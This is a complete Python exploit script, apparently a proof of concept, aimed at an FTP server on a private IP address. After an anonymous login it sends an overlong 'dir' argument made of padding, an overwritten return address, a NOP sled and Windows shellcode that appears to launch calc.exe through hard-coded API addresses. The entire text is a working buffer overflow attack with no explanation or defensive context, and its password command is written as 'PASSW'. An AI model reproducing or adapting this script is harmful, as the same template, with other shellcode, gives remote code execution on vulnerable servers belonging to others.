import socket, struct
IP = "192.168.1.105"
PORT = 21

def exploit(bytes, IP, PORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((IP, PORT))
    s.recv(1024)
    s.send(b'USER anonymous\r\n')
    s.recv(1024)
    s.send(b'PASSW anonymous@anon.org\r\n')
    s.recv(1024)
    s.send(b'dir ' + bytes + b'\r\n')
    s.close()


shellcode = b'\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe7\x57\xb8\xc7\x93\xc2\x77\xff\xd0\x31\xc0\x50\xb8\x0a\xd2\x81\x7c\xff\xd0'
EIP = struct.pack("<I", 0x7E429353)
bytes = 247 * b"A" + EIP + b"\x90"*8 + shellcode
exploit(bytes, IP, PORT)